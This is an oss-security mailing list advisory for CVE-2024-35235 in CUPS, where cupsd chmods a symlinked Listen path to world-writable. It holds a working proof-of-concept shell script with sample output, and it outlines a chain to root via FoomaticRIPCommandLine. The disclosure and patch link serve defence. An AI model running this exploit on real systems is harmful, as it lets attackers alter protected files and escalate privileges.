Received: (qmail 9439 invoked by uid 550); 11 Jun 2024 14:10:50 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1497 invoked from network); 11 Jun 2024 14:07:41 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
	s=mimecast20190719; t=1718114852;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:mime-version:mime-version:content-type:content-type:
	 content-transfer-encoding:content-transfer-encoding;
	bh=w6eyxPU7lbO1v4v1f/oHEHOIjvrIJAiakqR7ZDwVU2g=;
	b=JjQRKFZpX953TD3NdpMafgI4i7CZboTznadwi1XFp0eFq+7yVt8dhS5KFUqy9in68GoV9K
	GSbm+Ld3IGsUMo57JIMb+7dS3k36w0bVRbFmK37c0RIBva8wueprflOAalfO4g/rfZaqSN
	5+BVz1Gds8+Ev2mJdI+ttd5/Cd/09+c=
X-MC-Unique: xNfhucBMPyq4aNcWP5GAVw-1
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1718114849; x=1718719649;
        h=content-transfer-encoding:subject:from:to:content-language
         :user-agent:mime-version:date:message-id:x-gm-message-state:from:to
         :cc:subject:date:message-id:reply-to;
        bh=w6eyxPU7lbO1v4v1f/oHEHOIjvrIJAiakqR7ZDwVU2g=;
        b=cGgbwAD74nCQqOkyb5WM40x6MclY4qgCZFgV30ZGMjMwhaieyUVCqt7zt/MqYacpUN
         kE6+DSccwCSMxBUSwohOHbvjlwv4ALDbdEoi06OanXoA4OEVwPDJBDulWEkyaTNszcLF
         Wo1pTgLnbwOAZPsYe9+PyzzvtG0QC89jlfuBct7b9YwTIB/kXdBiX/RDXrHEHsUZKHzU
         PECH89YRoWISZY11//6OC1KG+g7JRJum5xMwbw04eQmXKISRCyAXjxpdpGjcNrfrnl4B
         kxvqTao6UczEhEJi5LzxiX/LSQFgjsCRDBfYfxDn8YQnckssU7xLEvs3FEGCwP30z+vp
         CvVQ==
X-Gm-Message-State: AOJu0YwwbtBG1wPdRcwEs1/LiEmDAF2TvtKvuHm569IOwEMczVkbuHNW
	nZqZkjYA69mQOfl2sbbl7jERMHxW7U/9jhpQAOMJVbwitX5g12bUQF3wIO5pimxN27Fq/aWKOa4
	UtwHLyjITCcBHye2g8RisPza/zpdE5kB7v6LlOiWUe7MWD6Y+ZaJoZFD2OfQCDWxCFhRrg2RVZQ
	l6qZxWOw5KMjwsnpnEOp/kNXWQQnQEru+LFwnGNtuReqnQqAjc
X-Received: by 2002:a05:600c:46c8:b0:422:5953:343b with SMTP id 5b1f17b1804b1-4225953360bmr16745025e9.34.1718114849562;
        Tue, 11 Jun 2024 07:07:29 -0700 (PDT)
X-Google-Smtp-Source: AGHT+IH0z8WqFlOaRv1QkP/ZOfTHNis2gQCYGB+/Ef5hXr49y3dYx6cOlyPTgsVHWBUpmZufc36cig==
X-Received: by 2002:a05:600c:46c8:b0:422:5953:343b with SMTP id 5b1f17b1804b1-4225953360bmr16744835e9.34.1718114849042;
        Tue, 11 Jun 2024 07:07:29 -0700 (PDT)
Message-ID: <28902b9a-3255-4bfe-a3c8-d0e08fb5f426@redhat.com>
Date: Tue, 11 Jun 2024 16:07:27 +0200
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
To: oss-security@lists.openwall.com
From: Zdenek Dohnal <zdohnal@redhat.com>
X-Mimecast-Spam-Score: 0
X-Mimecast-Originator: redhat.com
Content-Language: en-US
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit
Subject: [oss-security] CVE-2024-35235 cups: Cupsd Listen arbitrary chmod 0140777

Hi all,

there is vulnerability CVE-2024-35235 in cups project:


    Description


      Summary

When starting the cupsd server with a Listen configuration item pointing 
to a symbolic link, the cupsd process can be caused to perform an 
arbitrary chmod of the provided argument, providing world-writable 
access to the target.


      Details

This is an excerpt from a larger chain of vulnerabilities reported in 
Ubuntu 24.04. There is an assumption for exploitation that 
/etc/cups/cupsd.conf can be successfully edited (this has been omitted 
here as it is believed to be out of scope).

When setting up the bind for unix sockets configured in the Listen 
parameters of the configuration file, the code does not check for a 
successful call to |unlink| and |bind| prior to performing the call to 
|chmod|. [1]

On Ubuntu 24.04, by setting the Listen argument to a path such as 
|/tmp/stage/file|, where |file| is a symlink elsewhere in the system, 
the previous call to |unlink| for the path will fail due to AppArmor 
[2], and the subsequent call to |bind| will also fail due to the file 
still existing. The return value of the call to |bind| is not checked 
before the call to |chmod|, so a successfully planted symbolic link 
which causes the |bind| to fail will still be traversed by the call to 
|chmod| and the file permissions changed to be world writable.

On systems where the Ubuntu AppArmor policy is not in place, this 
vulnerability still exists but as a race condition between the call to 
|unlink| and the call to |bind|. A sufficiently fast attacker could 
place a symbolic link at the configured location after the call to 
|unlink|, causing the |bind| to fail once again and performing a 
successful |chmod|.

      Severity: Moderate - CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N
      PoC

The following script can be used for exploitation, sudo is used to 
emulate the above mentioned Listen configuration access.

```
set -e exploit()

{

     echo "Staging..."

     mkdir -m 777 /tmp/stage

     ln -s /etc/cups/cupsd.conf /tmp/stage/cupsd.conf

     # emulate configuration access to cupsd.conf

     echo 'Listen /tmp/stage/cupsd.conf' | sudo tee -a /etc/cups/cupsd.conf

     echo

     echo "Current permissions of cupsd.conf"

     ls -l /etc/cups/cupsd.conf

     tail -n1 /etc/cups/cupsd.conf || true

     echo echo "Restarting cupsd"

     sudo systemctl restart cups

     echo

     echo "New permissions of cupsd.conf"

     ls -l /etc/cups/cupsd.conf

     tail -n1 /etc/cups/cupsd.conf || true

}

cleanup()

{

     sudo sed -i '/Listen \/tmp\/stage\/cupsd.conf/d' /etc/cups/cupsd.conf

     sudo chmod 640 /etc/cups/cupsd.conf

     rm -rf /tmp/stage

}

$@

```

Sample output can be seen below:

```

$ sh poc.sh exploit

Staging...

Listen /tmp/stage/cupsd.conf

Current permissions of cupsd.conf

-rw-r----- 1 root lp 4987 May 24 10:18 /etc/cups/cupsd.conf

tail: cannot open '/etc/cups/cupsd.conf' for reading: Permission denied

Restarting cupsd

New permissions of cupsd.conf

  -rwxrwxrwx 1 root lp 4987 May 24 10:18 /etc/cups/cupsd.conf

Listen /tmp/stage/cupsd.conf

$ sh poc.sh cleanup

```


      Impact

Given that cupsd is often running as root, this can result in the change 
of permission of any user or system files to be world writable.

Given the aforementioned Ubuntu AppArmor context, on such systems this 
vulnerability is limited to those files modifiable by the cupsd process. 
In that specific case it was found to be possible to turn the 
configuration of the Listen argument into full control over the 
cupsd.conf and cups-files.conf configuration files. By later setting the 
User and Group arguments in cups-files.conf, and printing with a printer 
configured by PPD with a |FoomaticRIPCommandLine| argument, arbitrary 
user and group (not root) command execution could be achieved, which can 
further be used on Ubuntu systems to achieve full root command execution.

Patch:

https://github.com/OpenPrinting/cups/commit/a436956f3


For OpenPrinting CUPS community,

Zdenek Dohnal

CUPS 2.4.x release manager

-- 
Zdenek Dohnal
Senior Software Engineer
Red Hat, BRQ-TPBC

